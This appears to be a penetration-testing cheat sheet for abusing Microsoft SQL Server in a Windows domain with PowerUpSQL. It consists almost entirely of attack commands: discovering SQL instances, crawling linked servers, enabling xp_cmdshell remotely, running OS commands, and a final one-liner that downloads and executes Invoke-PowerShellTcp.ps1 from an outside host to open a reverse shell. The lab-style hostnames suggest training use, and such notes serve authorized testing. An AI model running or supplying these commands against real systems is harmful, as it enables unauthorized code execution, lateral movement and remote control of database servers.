# 🟢 Abuse MSSQL Servers

```
. .\PowerUpSQL.ps1
```

### **Discovery SPN scanning**

```
Get-SQLInstanceDomain
```

### **Check accessibility**

```
Get-SQLConnectionTestThreaded
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded – Verbose
```

### **Gather information**

```
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```

### **Search for links to remote servers**

```
Get-SQLServerLink -Instance <sql instance> -Verbose
```

### **Enumerate database links**

```
Get-SQLServerLinkCrawl -Instance <sql instance> -Verbose
```

### **Enable xp\_cmdshell**

```
Execute(‘sp_configure “xp_cmdshell”,1;reconfigure;’) AT “<sql instance>”
```

### **Execute commands**

```
Get-SQLServerLinkCrawl -Instance <sql instance> -Query "exec master..xp_cmdshell 'whoami'"
```

### **Execute reverse shell example**

{% code overflow="wrap" %}
```
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'Powershell.exe iex (iwr http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1 -UseBasicParsing);reverse -Reverse -IPAddress xx.xx.xx.xx -Port 4000'"
```
{% endcode %}
